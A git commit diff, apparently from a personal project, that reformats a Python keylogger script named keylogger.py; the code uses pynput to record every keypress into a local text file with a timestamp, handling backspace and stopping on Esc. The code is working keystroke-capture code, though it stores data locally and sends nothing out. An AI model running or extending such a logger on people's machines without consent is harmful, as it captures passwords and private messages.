a796b0b11dc34369ca0c0d2b351c71d7a0a10d24
Ashvin <ashvinjangid10@gmail.com>
2024-08-14 13:57:40 +0530

    format the code

--- keylogger.py
+++ keylogger.py
@@ -1,14 +1,12 @@
 from pynput import keyboard
 import datetime
 
-# Record the date and time in the file
-with open("./file.txt", "a") as file:
-    current_datetime = datetime\
-                        .datetime\
-                        .now()\
-                        .strftime("%d/%b/%Y, %I:%M %p")
-    file.write(f"\n\n{current_datetime}\n")
 
+def remove_last_char():
+    with open("./file.txt", "r") as output_file:
+        data = output_file.read()
+    with open("./file.txt", "w") as output_file:
+        output_file.write(data[:-1])
 
 def on_press(key):
         try:
@@ -21,13 +19,20 @@ def on_press(key):
                     output_file.write(key.char)
         except AttributeError:
             if key == keyboard.Key.backspace:
-                with open("./file.txt", "r") as output_file:
-                    data = output_file.read()
-                with open("./file.txt", "w") as output_file:
-                    output_file.write(data[:-1])
+                remove_last_char()
             elif key == keyboard.Key.esc:
                 # Stop listener
                 return False
+
+
+# Record the date and time in the file
+with open("./file.txt", "a") as file:
+    current_datetime = datetime\
+                        .datetime\
+                        .now()\
+                        .strftime("%d/%b/%Y, %I:%M %p")
+    file.write(f"\n\n{current_datetime}\n")
+
 
 # Collect events until released
 with keyboard.Listener(on_press=on_press) as listener:
